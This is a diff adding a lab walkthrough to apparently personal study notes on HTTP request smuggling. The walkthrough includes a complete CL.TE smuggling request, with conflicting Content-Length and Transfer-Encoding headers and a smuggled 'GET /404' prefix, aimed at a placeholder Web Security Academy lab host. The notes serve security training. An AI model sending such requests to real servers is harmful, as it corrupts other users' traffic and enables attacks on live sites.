@@ -41,3 +41,32 @@ X
 The transfer encoding header gets checked and only passes part of the request, omitting the X. The back-end server uses the `Content-Length` header, expects more content in the message body and waits causing the time delay to detect.
 
 ## Labs Walkthrough
+
+### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+
+Send this in repeater twice, to get a smuggle in and get a 404 error
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
+### 
+
+
+
+
+
+
+
+
+
+
